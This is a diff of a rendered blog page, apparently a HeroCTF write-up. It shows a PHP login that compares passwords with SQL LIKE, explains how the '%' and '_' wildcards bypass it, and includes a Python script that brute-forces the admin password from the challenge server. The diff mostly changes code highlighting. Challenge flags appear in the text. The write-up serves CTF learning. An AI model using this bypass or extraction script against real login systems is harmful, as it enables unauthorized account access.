@@ -106,7 +106,7 @@
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.e2cd7bb31175229efffd2db21407e5f6ecab44bbd0fcaef56c6905dc3285f85e.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.0116cf0f609eb527b85b49d8ffe467707a64be5e30ae09f6e6ca742edf46e161.css">
 
 
     
@@ -403,27 +403,26 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 <p>Random default passwords like “password” or “password123” does not seem to work(No idea why) but checking the source of the webpage, we are greeted with an intriguing message in the comments.</p>
 <p><img src="https://cdn-images-1.medium.com/max/2000/1*kEVkPR-78D_VwGD3Ulih6g.png" alt=""></p>
 <p>This suggests the presence of a backup file which the admin forgot to remove and we can download it by navigating to /login.php.bak</p>
-<pre><code>&lt;?php
-
-require_once(__DIR__  . &quot;/config.php&quot;);
-
-if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {
-    $username = $_POST['username'];
-    $password = $_POST['password'];
-
-$sql = &quot;**SELECT * FROM users WHERE username = :username AND password LIKE :password;**&quot;;
-    $sth = $db-&gt;prepare($sql, array(PDO::ATTR_CURSOR =&gt; PDO::CURSOR_FWDONLY));
-    $sth-&gt;execute(array(':username' =&gt; $username, ':password' =&gt; $password));
-    $users = $sth-&gt;fetchAll();
-
-if (count($users) === 1) {
-        $msg = 'Welcome back admin ! Here is your flag : ' . FLAG;
-    } else {
-        $msg = 'Wrong username or password.';
-    }
-}
-</code></pre>
-<p>This filereveals that we would have to do an SQL injection attack to bypass the login. As we have the SQL query used to retrieve the username and password from the database, crafting a payload becomes much easier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>    <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">require_once</span>(<span style="color:#66d9ef">__DIR__</span>  <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;/config.php&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        $username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;username&#39;</span>];
+</span></span><span style="display:flex;"><span>        $password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;**SELECT * FROM users WHERE username = :username AND password LIKE :password;**&#34;</span>;
+</span></span><span style="display:flex;"><span>        $sth <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>($sql, <span style="color:#66d9ef">array</span>(<span style="color:#a6e22e">PDO</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ATTR_CURSOR</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">PDO</span><span style="color:#f92672">::</span><span style="color:#a6e22e">CURSOR_FWDONLY</span>));
+</span></span><span style="display:flex;"><span>        $sth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;:username&#39;</span> <span style="color:#f92672">=&gt;</span> $username, <span style="color:#e6db74">&#39;:password&#39;</span> <span style="color:#f92672">=&gt;</span> $password));
+</span></span><span style="display:flex;"><span>        $users <span style="color:#f92672">=</span> $sth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetchAll</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">count</span>($users) <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>            $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Welcome back admin ! Here is your flag : &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">FLAG</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Wrong username or password.&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>This filereveals that we would have to do an SQL injection attack to bypass the login. As we have the SQL query used to retrieve the username and password from the database, crafting a payload becomes much easier.</p>
 <p>We already know that the username is “admin” so we have to find a way to bypass the password check. But instead of the usual “SELECT ” Operator, the server is using the “LIKE” SQL Operator to check the password.</p>
 <p>The LIKE Operator, as given in <a href="https://www.w3schools.com/sql/sql_like.asp" target="_blank">w3schools</a>, is used in a WHERE clause to search for a specified pattern in a column. This operator has two wildcards which can be used with it:</p>
 <ul>
@@ -445,37 +444,36 @@ flag-Hero{pwnQL_b4sic_0ne_129835}</p>
 <p><img src="https://cdn-images-1.medium.com/max/2000/1*i7Dkab_iwY7GIhJgzKJSyg.png" alt=""></p>
 <p>Here, we are provided with the same login page but to get the flag, we have to extract the admin password. This was a pretty interesting challenge and if it was a normal SQL injection, it could be done using the “UNION SELECT” operator but in this case, the presence of wildcards- ‘%’ and ‘_’ with the “LIKE” operator makes it easy for us.</p>
 <p>As mentioned above, the ‘%’ wildcard can be used to denote multiple characters which is why we were able to bypass the login with just one ‘%’ sign. The ‘<em>’ only denotes single characters. So, if were to try just one ‘</em>’, we would not be able to bypass the login. But this behaviour is useful to us as we can find out the number of characters in the password.</p>
-<p>Using username:admin and password:_________<em>(10 ‘</em>’), we are able to bypass login, indicating that the password has 10 characters.</p>
+<p>Using username:admin and password:<code>__________</code>(10 ‘_’), we are able to bypass login, indicating that the password has 10 characters.</p>
 <h3 id="extracting-the-password">Extracting the password</h3>
 <p>We have to brute force each character to find the password and that can be done using two methods.</p>
 <p>If, for example, the password was “password”, using “p_________”(p and 9 ‘<em>’) will bypass the password. So will using “p%”. So we can either choose to replace each ‘</em>’ with a character or keep adding characters before the ‘%’ sign(pa%, pass% etc.) till we bypass login and finally find the password.</p>
 <p>I wrote the following python script to automate the process.</p>
-<pre><code>import requests
-from string import printable
-
-printable = printable.replace(&quot;%&quot;, '')
-
-url = &quot;[http://chall1.heroctf.fr:8080/index.php](http://chall1.heroctf.fr:8080/index.php)&quot;
-
-flag=''
-temp='%'
-
-def test(flag):
- payload={&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:flag+temp}
- r=requests.post(url, data=payload)
- print(f'\r{flag}', end='')
- return 'Here' in r.text
-
-while len(flag)&lt;10:
- for i in printable:
-  if test(flag+i):
-   flag+=i
-   break
-
-print(flag)
-#Hero{s3cur3p@ss}
-</code></pre>
-<p>This returns the following output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>    <span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> string <span style="color:#f92672">import</span> printable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    printable <span style="color:#f92672">=</span> printable<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;%&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[http://chall1.heroctf.fr:8080/index.php](http://chall1.heroctf.fr:8080/index.php)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    temp<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;%&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>(flag):
+</span></span><span style="display:flex;"><span>     payload<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;password&#34;</span>:flag<span style="color:#f92672">+</span>temp}
+</span></span><span style="display:flex;"><span>     r<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>payload)
+</span></span><span style="display:flex;"><span>     print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Here&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> len(flag)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">10</span>:
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> printable:
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> test(flag<span style="color:#f92672">+</span>i):
+</span></span><span style="display:flex;"><span>       flag<span style="color:#f92672">+=</span>i
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(flag)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#Hero{s3cur3p@ss}</span>
+</span></span></code></pre></div><p>This returns the following output</p>
 <p><img src="https://cdn-images-1.medium.com/max/2000/1*LVl2pTow-N_D5Fo3lflvMw.png" alt=""></p>
 <p>We have successfully extracted the password- “s3cur3p@ss”</p>
 <blockquote>
